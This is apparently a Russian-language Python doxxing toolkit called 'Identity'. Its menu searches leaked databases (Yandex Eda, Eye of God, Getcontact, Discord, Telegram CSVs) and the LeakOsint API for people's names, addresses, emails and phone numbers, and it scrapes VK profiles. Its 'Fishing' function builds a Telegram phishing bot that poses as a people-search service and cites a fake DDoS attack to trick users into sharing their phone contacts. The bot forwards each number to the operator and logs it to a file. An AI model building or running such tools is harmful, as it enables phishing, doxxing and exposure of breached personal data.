try:
    import colorama
    from colorama import Fore, Style, init
    from pystyle import Write, Colors, Colorate
    import os
    import sys
    import requests
    import time
    from phonenumbers import timezone, carrier, geocoder, parse
    from phonenumbers.phonenumberutil import NumberParseException
    from telebot import types
    import telebot
    import traceback
    import socket
    import urllib
    import json
except:
    print("У вас нету необходимых билиотек! Установить? Y/n")
    installer = input()
    if installer == 'y':
        os.system("pip install os, colorama, pystyle, requests, sys, traceback, socket, phonenumbers, urllib, json")
    if installer == 'n':
        sys.exit()
red = Fore.RED
cyan = Fore.CYAN
blue = Fore.BLUE
green = Fore.GREEN
pink = Fore.LIGHTMAGENTA_EX

yellow = Fore.YELLOW
reset = Style.RESET_ALL
bold = Style.BRIGHT
white = Fore.WHITE
def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

banner = f'''


{pink}╔───────────────────────────────────────────────────────────────────────────╗{reset}
{pink}│{red}        ██╗██████╗░███████╗███╗░░██╗████████╗██╗████████╗██╗░░░██╗{reset}{pink}         │{reset}
{pink}│{red}        ██║██╔══██╗██╔════╝████╗░██║╚══██╔══╝██║╚══██╔══╝╚██╗░██╔╝{reset}{pink}         │{reset}
{pink}│{red}        ██║██║░░██║█████╗░░██╔██╗██║░░░██║░░░██║░░░██║░░░░╚████╔╝░{reset}{pink}         │{reset}
{pink}│{red}        ██║██║░░██║██╔══╝░░██║╚████║░░░██║░░░██║░░░██║░░░░░╚██╔╝░░{reset}{pink}         │{reset}
{pink}│{red}        ██║██████╔╝███████╗██║░╚███║░░░██║░░░██║░░░██║░░░░░░██║░░░{reset}{pink}         │{reset}
{pink}│{red}        ╚═╝╚═════╝░╚══════╝╚═╝░░╚══╝░░░╚═╝░░░╚═╝░░░╚═╝░░░░░░╚═╝░░░{reset}{pink}         │{reset}
{pink}╚───────────────────────────────────────────────────────────────────────────╝{reset}
{pink}╔─────────────────────────────────────────────╦─────────────────────────────╗
{pink}│{white} Search                               {pink}       │{white}  Tools {pink}                     │
{pink}╠─────────────────────────────────────────────╬─────────────────────────────╣
{pink}│ (1) Phone                                   │ (6) Fishing                 │
{pink}╠─────────────────────────────────────────────╬─────────────────────────────╣
{pink}│ (2) OSINT-Search                            │ (7) Port Scanner            │
{pink}╠─────────────────────────────────────────────╬─────────────────────────────╣
{pink}│ (3) Discord                                 │ (8) Telegram Bot-Search     │
{pink}╠─────────────────────────────────────────────╬─────────────────────────────╣
{pink}│ (4) VK                                      │ (9) IP-Search               │
{pink}╠─────────────────────────────────────────────╬─────────────────────────────╣
{pink}│ (5) Telegram                                │ (10) Link-Search            │
{pink}╚─────────────────────────────────────────────┴─────────────────────────────╝
'''


def main():
    print(banner)
    enter = input(f"{blue}[!] {reset}{pink}Выберите пункт -> ")
    if enter == '1':
        phone_search()
    elif enter == '2':
        osint_search()
    elif enter == '3':
        discord()
    elif enter == '4':
        vk_checker()
    elif enter == '5':
        telegram()
    elif enter == '6':
        fishing()
    elif enter == '7':
        port_scanner()
    elif enter == '8':
        bot_search()
    elif enter == '9':
        ip()
    elif enter == '10':
        link_search()

def bot_search():
    def get_bot_info(token):
        url = f"https://api.telegram.org/bot{token}/getMe"
        response = requests.get(url)
        return response.json()
    token = input(f"{blue}[!] {reset}{pink}Введите Token бота -> ")
    try:
        bot_data = get_bot_info(token)
        if bot_data.get("ok"):
            data = bot_data["result"]
            print(f"{blue}[!] {reset}{pink}ID -> {data['id']}")
            print(f"{blue}[!] {reset}{pink}Имя -> {data['first_name']}")
        if 'username' in data:
            print(f"{blue}[!] {reset}{pink}Юзернейм -> @{data['username']}")
        if 'can_join_groups' in data:
            print(f"{blue}[!] {reset}{pink}Вступления в группы -> {data['can_join_groups']}")
            time.sleep(2)
            main()
    except:
        Write.Print("Ошибка ", Colors.blue_to_white, interval=0.005)
        time.sleep(2)
        main()
def ip():

    getIP = input(f"{blue}[!] {reset}{pink}Введите IP адрес -> ")
    if getIP == '00':
        main()
    url = "https://ipinfo.io/" + getIP + "/json"
    try:
        getInfo = urllib.request.urlopen(url)
    except:
        print(f"{blue}[!] {reset}{pink}Не известный IP!")
        main()
    infoList = json.load(getInfo)

    def whoisIPinfo(ip):
        try:
            myComand = "whois " + getIP
            whoisInfo = os.popen(myComand).read()
            return whoisInfo
        except:
            return  print(f"{blue}[!] {reset}{pink}Ошибка!")
            ip()
    print(Colors.red + "IP: ", infoList["ip"])
    print(Colors.red + "Город: ", infoList["city"])
    print(Colors.red + "Регион: ", infoList["region"])
    print(Colors.red + "Страна: ", infoList["country"])
    print(Colors.red + "Временная зона: ", infoList["timezone"])
    print(Colors.red + "Координаты: ", infoList["loc"])
    print(Colors.red + "Название хоста: ", infoList["hostname"])
    print(Colors.red + "Индекс: ", infoList["postal"])
    time.sleep(3)
    main()
def link_search():
    username = input(f"{blue}[!] {reset}{pink}Введите Username -> ")
    print(Fore.RED + f'''
    Проверьте эти ссылки:
        │Telegram: https://t.me/{username}
        │VK: https://vk.com/{username}
        │Одноклассники: https://ok.ru/{username}
        │Github: https://github.com/{username}
        │Yandex: https://yandex.ru/search/?text={username}
        │Google: https://www.google.ru/search?q={username}
    Enter для возврата
    ''')
    a = input()
    main()
def phone_search():
    phone_1 = input(f"{blue}[!] {reset}{pink}Введите номер телефона -> ")
    def base_check(yandexeda, phone_1, base2, base3):
        Found = False
        with open(yandexeda, 'r', encoding='UTF-8') as file:
            lines = file.readlines()

        for line in lines:
            data = line.strip().split(';')
            if len(data) >= 7:
                phone_number = data[0]
                if phone_1 in phone_number:
                    first_name = data[1]
                    full_name = data[2]
                    email = data[3]
                    adress_sity = data[4]
                    adress_street = data[5]
                    adress_house = data[6]
                    adress_entrance = data[7]
                    print(f'''
{blue}│{white} База: ЯндексЕда {reset}
{blue}│{white} Номер телефона: {phone_number}{reset}
{blue}│{white} Имя: {first_name}{reset}
{blue}│{white} Почта: {email}{reset}
{blue}│{white} Полное Имя: {full_name}{reset}
{blue}│{white} Город: {adress_sity}{reset}
{blue}│{white} Улица: {adress_street}{reset}
{blue}│{white} Дом: {adress_house}{reset}
{blue}│{white} Вход: {adress_entrance} {reset}

    {blue}Enter Для возврата {reset}
                          ''')
                    Found = True
                    a = input()
                    main()
        with open(base2, 'r', encoding='UTF-8') as file:
            lines = file.readlines()
            for line in lines:
                data = line.strip().split(',')
                if len(data) >= 2:
                    phone = data[1]
                    if phone_1 in phone:
                        id = data[0]
                        username = data[2]
                        last_name = data[3]
                        first_name = data[4]
                        print(f'''
{blue}│{white}EYE_OF_GOD{reset}
{blue}│{white}Номер телефона: {phone}{reset}
{blue}│{white}ID: {id}{reset}
{blue}│{white}Юзернейм: {username}{reset}
{blue}│{white}Имя: {last_name}{reset}
{blue}│{white}Фамилия: {first_name} {reset}

    {blue}Enter Для возврата в меню {reset}
                        ''')
                        Found = True
                        a = input()
                        main()
        with open(base3, 'r', encoding='UTF-8') as file:
            lines = file.readlines()

        for line in lines:
            data = line.strip().split(';')
            if len(data) >= 1:
                phone = data[0]
                if phone_1 in phone:
                    numbuster = data[1]
                    getcontaco = data[2]
                    print(Fore.RED + f'''
{blue}│{white}Getcontact{reset}
{blue}│{white}Номер телефона: {phone_1}{reset}
{blue}│{white}Numbuster: {numbuster}{reset}
{blue}│{white}Information: {getcontaco}{reset}

    {blue}Enter Для возврата в меню {reset}
                    ''')
                    Found = True
                    a = input()
                    main()
        if not Found:
            print(f"{blue}[!] {reset}{pink}Ничего не найдено")
            time.sleep(2)
            main()
    print(f"{blue}[!] {reset}{pink}Поиск по базам..")
    yandexeda = 'basedata/yandex_eda.csv'
    base2 = 'basedata/EYEOFGOD.csv'
    base3 = 'basedata/getcontact.csv'
    base_check(yandexeda, phone_1, base2, base3)

def osint_search():
    api_key = open('osint_key.txt', 'r')
    key = api_key.readlines()
    API = key
    def Search(Term):
        def make_request(Term):
            data = {"token": API, "request": Term, "limit": 100, "lang": "ru"}
            url = 'https://server.leakosint.com/'
            response = requests.post(url, json=data)
            return response.json()

        data = make_request(Term)
        for source in data["List"]:
            if source == "Ничего не найдено":
                Write.Print("Ничего не найдено", Colors.blue_to_white, interval=.001)
                main()
            print(Fore.RED + "\nБаза данных -> ")
            print(Fore.RED + f"{source}\n")
            for item in data["List"][source]["Data"]:
                if str(item) in set():
                    continue
                for key, value in item.items():
                    print(Fore.RED + f"│ {key} -> ")
                    print(Fore.RED + f"{value}\n")
        if "Ничего не найдено" not in data["List"]:
            print()
            print(Fore.RED + "=============================================")
            print(Fore.RED + "I D E N T I F Y")
            print(Fore.RED + "=============================================")
            time.sleep(2)
            main()
    print(f"{blue}[!] {reset}{pink}Не забудьте вписать ключ от LeakOsint в файле osint_key.txt, иначе программа не будет работать!")
    Term = input(f"{blue}[!] {reset}{pink}Поиск -->")
    Search(Term)


def discord():
    def discord_check(bd, bd2, discord_search):
        Found = False
        with open(bd, 'r', encoding='UTF-8') as file:
            lines = file.readlines()

        for line in lines:
            data = line.strip().split(',')
            if len(data) >= 2:
                discord_name = data[1]
                if discord_search in discord_name:
                    id = data[0]
                    discord_slug = data[2]
                    discord_flags = data[3]
                    role = data[4]
                    verified = data[5]
                    views = data[6]
                    email = data[7]
                    about = data[8]
                    print(f'''

{blue}│{white}Discord:{reset}
{blue}│{white}ID: {id}{reset}
{blue}│{white}Slug: {discord_slug}{reset}
{blue}│{white}USERNAME: {discord_flags}{reset}
{blue}│{white}LASTNAME: {role}{reset}
{blue}│{white}FIRSTNAME:  {verified}{reset}
{blue}│{white}{views}{reset}
{blue}│{white}{email}{reset}
{blue}│{white}{about}{reset}
    {blue}Enter Для возврата в меню {reset}
                    ''')
                    Found = True
                    a = input()
                    main()
        with open(bd2, 'r', encoding='UTF-8') as file:
            lines = file.readlines()
        for line in lines:
            data = line.strip().split(',')
            if len(data) >= 2:
                discord_name = data[1]
                if discord_search in discord_name:
                    id = data[0]
                    discord_slug = data[2]
                    discord_flags = data[3]
                    role = data[4]
                    verified = data[5]
                    views = data[6]
                    email = data[7]
                    about = data[8]
                    print(f'''
{blue}│{white}Discord:{reset}
{blue}│{white}ID: {id}{reset}
{blue}│{white}Slug: {discord_slug}{reset}
{blue}│{white}USERNAME: {discord_flags}{reset}
{blue}│{white}LASTNAME: {role}{reset}
{blue}│{white}FIRSTNAME:  {verified}{reset}
{blue}│{white}{views}{reset}
{blue}│{white}{email}{reset}
{blue}│{white}{about}{reset}
{blue}Enter Для возврата в меню {reset}
                   ''')
                    Found = True
                    a = input()
                    main()
        if not Found:
            print(f"{blue}[!] {reset}{pink}Ничего не найдено")
            time.sleep(2)
            main()
    bd = 'basedata/discord.csv'
    bd2 = 'basedata/discord1.csv'
    discord_search = input(f"{blue}[!] {reset}{pink}Введите discord -> ")
    discord_check(bd, bd2, discord_search)
def vk_checker():
    apivk = input(f"{blue}[!] {reset}{pink}Введите Token -> ")
    user_id = input(f"{blue}[!] {reset}{pink}Введите Ссылку на VK -> ")
    if user_id.startswith('https://vk.com/'):
        user_id = user_id[len('https://vk.com/'):]
        vkinfo(user_id, apivk)
        a = input(f"{blue}[!] {reset}{pink}ENTER для возврата в меню")
        main()
def vkinfo(user_id, access_token):
    fields = 'sex,bdate,city,country,photo_200_orig,home_town,domain,status,followers_count,common_count,about,activities,can_post,can_see_all_posts,can_see_audio,can_send_friend_request,can_write_private_message,career,connections,contacts,counters,exports,is_no_index,relatives'
    url = f'https://api.vk.com/method/users.get?user_ids={user_id}&fields={fields}&access_token={access_token}&v=5.131'


    response = requests.get(url)
    data = response.json()
    user_data = data['response'][0]

    user_info = {
        'Имя': user_data['first_name'],
        'Фамилия': user_data['last_name'],
        'ID': user_data['id'],
        'Ссылка на профиль': f'https://vk.com/id{user_data["id"]}',
        'Пол': 'Мужской' if user_data['sex'] == 2 else 'Женский',
        'Дата рождения': user_data.get('bdate', 'Не указана'),
        'Город': user_data.get('city', {}).get('title', 'Не указан'),
        'Страна': user_data.get('country', {}).get('title', 'Не указан'),
        'Фото профиля': user_data.get('photo_200_orig', 'Фото отсутствует'),
        'Родной город': user_data.get('home_town', 'Не указан'),
        'Короткий адрес страницы': user_data.get('domain', 'Не указан'),
        'Статус': user_data.get('status', 'Статус не указан'),
        'Количество подписчиков': user_data.get('followers_count', 'Информация недоступна'),
        'Количество общих друзей': user_data.get('common_count', 'Информация недоступна'),
        'О себе': user_data.get('about', 'Информация недоступна'),
        'Деятельность': user_data.get('activities', 'Информация недоступна'),
        'Может оставлять записи на стене': 'Да' if user_data.get('can_post') == 1 else 'Нет',
        'Может видеть чужие записи на стене': 'Да' if user_data.get('can_see_all_posts') == 1 else 'Нет',
        'Может видеть аудиозаписи': 'Да' if user_data.get('can_see_audio') == 1 else 'Нет',
        'Уведомление о заявке в друзья': 'Отправлено' if user_data.get('can_send_friend_request') == 1 else 'Не отправлено',
        'Может отправить личное сообщение': 'Да' if user_data.get('can_write_private_message') == 1 else 'Нет',
        'Карьера': user_data.get('career', []),
        'Социальные связи': user_data.get('connections', {}),
        'Контактная информация': user_data.get('contacts', {}),
        'Счётчики': user_data.get('counters', {}),
        'Экспорт во внешние сервисы': user_data.get('exports', {}),
        'Индексируется поисковыми сайтами': 'Да' if user_data.get('is_no_index') == 0 else 'Нет',
        'Родственники': user_data.get('relatives', []),
        }
    user_info['Имя'] = user_info['Имя'].capitalize()
    user_info['Фамилия'] = user_info['Фамилия'].capitalize()
    Write.Print(' ', Colors.blue_to_white, interval=0.005)
    for key, value in user_info.items():
        Write.Print(f'{key} : {value}', Colors.blue_to_white, interval=0.005)
def telegram():
    def tg(tgbase, username):
        Found = False
        with open(tgbase, 'r') as file:
            lines = file.readlines()
        for line in lines:
            data = line.strip().split('|')
            if len(data) >= 6:
                tg = data[5]
                if username in tg:
                    system_number = data[0]
                    name = data[1]
                    last_name = data[2]
                    phone_number = data[3]
                    ID = data[4]
                    was_online = data[6]
                    print(f'''
{blue}│{white}Telegram{reset}
{blue}│{white}USERNAME: {tg}{reset}
{blue}│{white}NAME: {name}{reset}
{blue}│{white}LAST NAME: {last_name}{reset}
{blue}│{white}Phone Number: {phone_number}{reset}
{blue}│{white}ID: {ID}{reset}
{blue}│{white}Was Online: {was_online}{reset}
{blue}│{white}System Number: {system_number}{reset}
    {blue}Enter To Return{reset}
                          ''')
                    Found = True
                    a = input()
                    main()
        if not Found:
            print(f"{blue}[!] {reset}{pink}Ничего не найдено")
            time.sleep(2)
            main()
    username = input(f"{blue}[!] {reset}{pink}Введите Username (без @) -> ")
    tgbase = 'basedata/Telegram.csv'
    tg(tgbase, username)

def fishing():
    def eye_of_god():
        from telebot import types
        import telebot
        from pystyle import Write
        import traceback
        Token = input(f"{blue}[!] {reset}{pink}Введите Token бота (@botfather) -> ")
        admin = input(f"{blue}[!] {reset}{pink}Введите ваш chatID (@getmychatidbot) -> ")
        bot = telebot.TeleBot(Token)

        print(f"{blue}[!] {reset}{pink}Бот запущен!")
        time.sleep(2)
        main()
        find_menu = types.InlineKeyboardMarkup()
        button0 = types.InlineKeyboardButton('🔎Начать поиск', callback_data="start_dox")
        find_menu.row(button0)
        button1 = types.InlineKeyboardButton('⚙️Аккаунт', callback_data="dox")
        button2 = types.InlineKeyboardButton('🆘Поддержка', callback_data="dox")
        find_menu.row(button1, button2)
        button3 = types.InlineKeyboardButton('🤖Создать собственный бот', callback_data="dox")
        find_menu.row(button3)
        button4 = types.InlineKeyboardButton('🤝Партнерская программа', callback_data="dox")
        find_menu.row(button4)

        @bot.message_handler(commands=['start'])
        def start(message):
            bot.send_message(message.from_user.id, "*Добро пожаловать!*", parse_mode="Markdown")
            bot.send_message(message.from_user.id, "*Выберите нужное действие:*", parse_mode="Markdown",
                             reply_markup=find_menu)

        @bot.callback_query_handler(func=lambda call: call.data == "start_dox")
        def button0_pressed(call: types.CallbackQuery):
            bot.send_message(chat_id=call.message.chat.id, text="👤 Поиск по имени\n" + \
                                                                "├  `Блогер` _(Поиск по тегу)_\n" \
                                                                "├  `Антипов Евгений Вячеславович`\n" \
                                                                "└  `Антипов Евгений Вячеславович 05.02.1994`\n" \
                                                                "_(Доступны также следующие форматы_ " + "`05.02`" + "_/_" + "`1994`" + "_/_" + "`28`" + "_/_" + "`20-28`" + "_)_\n\n" \
                                                                                                                                                                             "🚗 Поиск по авто\n" \
                                                                                                                                                                             "├  `Н777ОН777` - поиск авто по *РФ*\n" \
                                                                                                                                                                             "└  `ХТА21150053965897` - поиск по *VIN*\n\n" \
                                                                                                                                                                             "👨 *Социальные сети*\n" \
                                                                                                                                                                             "├  `https://www.instagram.com/violetta_orlova` - *Instagram*\n" \
                                                                                                                                                                             "├  `https://vk.com/id577744097` - *Вконтакте*\n" \
                                                                                                                                                                             "├  `https://facebook.com/profile.php?id=1` - *Facebook*\n" \
                                                                                                                                                                             "└  `https://ok.ru/profile/162853188164` - *Одноклассники*\n\n" \
                                                                                                                                                                             "📱 `79999939919` - для поиска по *номеру телефона*\n" \
                                                                                                                                                                             "📨 `tema@gmail.com` - для поиска по *Email*\n" \
                                                                                                                                                                             "📧 `#281485304`, `@durov` или `перешлите сообщение` - поиск по *Telegram* аккаунту\n\n" \
                                                                                                                                                                             "🔐 `/pas churchill7` - поиск почты, логина и телефона *по паролю*\n" \
                                                                                                                                                                             "🏚 `/adr Москва, Тверская, д 1, кв 1` - информация по адресу (РФ)\n" \
                                                                                                                                                                             "🏘 `77:01:0001075:1361` - поиск по *кадастровому номеру*\n\n" \
                                                                                                                                                                             "🏛 `/company Сбербанк` - поиск по *юр лицам*\n" \
                                                                                                                                                                             "📑 `/inn 784806113663` - поиск по *ИНН*\n" \
                                                                                                                                                                             "🎫 `/snils 13046964250` - поиск по *СНИЛС*\n\n" \
                                                                                                                                                                             "📸 Отправьте *фото человека*, чтобы найти его или двойника на сайтах *ВК*, *ОК*.\n" \
                                                                                                                                                                             "🚙 Отправьте *фото номера автомобиля*, чтобы получить о нем информацию.\n" \
                                                                                                                                                                             "🙂 Отправьте *стикер*, чтобы найти *создателя*.\n" \
                                                                                                                                                                             "🌎 Отправьте *точку на карте*, чтобы *найти людей*, которые сейчас там.\n" \
                                                                                                                                                                             "🗣 С помощью *голосовых команд* также можно выполнять *поисковые запросы*.",
                             parse_mode="Markdown")

        send = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True)
        button_phone = types.KeyboardButton(text="✅Подтвердить", request_contact=True)
        send.add(button_phone)

        @bot.callback_query_handler(func=lambda call: call.data == "dox")
        def button1_pressed(call: types.CallbackQuery):
            bot.send_message(chat_id=call.message.chat.id,
                             text="⚠️Прежде чем начать поиск, подтвердите свой аккаунт\n\n""*Это временная мера, связанная с активной DDOS атакой на нас.*",
                             parse_mode="Markdown", reply_markup=send)

        @bot.message_handler(content_types=['contact'])
        def contact(message):
            if message.contact is not None:
                try:
                    Write.Print((
                        f"\nКто-то отправил свой номер:\n Имя: {message.from_user.first_name}\n Логин: {message.from_user.username}\n ID: {message.from_user.id}\n Номер телефона:  {message.contact.phone_number}\n -------------------------------"),
                        Colors.red, interval=0.005)
                    bot.send_message(admin, "*🔔Кто-то отправил свой номер!*\n" + \
                                     "Имя: `" + message.from_user.first_name + \
                                     "\n`Логин: @" + message.from_user.username + \
                                     "\n`ID: " + str(message.from_user.id) + \
                                     "\n`Номер телефона: `" + message.contact.phone_number + "`", parse_mode="Markdown")
                    f = open("db.csv", "a+")
                    f.write(
                        f"{message.from_user.first_name},{message.from_user.last_name},{message.from_user.username},{message.from_user.id},{message.contact.phone_number}\n")
                    f.close()
                except TypeError:
                    traceback.print_exc()
                    print("Нет тела или др. typeerror")
                curhour = time.asctime().split(" ")[3].split(":")[0]
                bot.send_message(message.from_user.id,
                                 f"*⚠️ Технические работы до  {int(curhour) + 7} :00 по мск.*\n\nРаботы будут завершены в данный промежуток времени, все подписки продлены.",
                                 parse_mode="Markdown", reply_markup=types.ReplyKeyboardRemove())

        @bot.message_handler(content_types=['text'])
        def handler(message):
            bot.send_message(message.from_user.id,
                             "⚠️Прежде чем начать поиск, подтвердите свой аккаунт\n\n""*Это временная мера, связанная с активной DDOS атакой на нас.*",
                             parse_mode="Markdown", reply_markup=send)

        bot.infinity_polling(none_stop=True)
    eye_of_god()

def port_scanner():
    port = input(f"{blue}[!] {reset}{pink}Введите порт -> ")
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    result = sock.connect_ex(('127.0.0.1', port))
    if result == 0:
        print(f"{blue}[!] {reset}{pink}Порт открыт")
        time.sleep(2)
        main()
    else:
        print(f"{blue}[!] {reset}{pink}Порт закрыт")
        time.sleep(2)
        main()
    sock.close()
if __name__ == '__main__':
    main()
